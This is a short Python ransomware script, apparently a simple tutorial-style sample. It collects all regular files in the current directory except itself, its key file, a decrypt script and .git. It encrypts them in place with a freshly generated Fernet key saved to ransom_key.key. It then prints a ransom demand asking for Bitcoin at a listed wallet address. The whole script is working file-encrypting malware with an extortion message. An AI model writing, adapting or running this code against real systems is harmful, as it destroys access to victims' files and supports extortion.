#! /usr/bin/env python3

import os
from cryptography.fernet import Fernet

# find the files

files = []

# go through every file we can find in our current working directory
# we do not want to encrypt the ransomware file though!
# we also don't want to add directories
for file in os.listdir():
    if file == "ransomware.py" or file == "ransom_key.key" or file == "decrypt_ransomware.py":
        continue
    if file == ".git":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)


key = Fernet.generate_key()

with open("ransom_key.key","wb") as ransom_key:
    ransom_key.write(key)

for file in files:
    with open(file, "rb") as currFile:
        contents = currFile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as currFile:
        currFile.write(contents_encrypted)

print('All of your files have been encrypted! Please send any amount of Bitcoin to bc1qnpdleg6j602d77460xaesnk8u3eqx4aclekv7v to decrypt.')
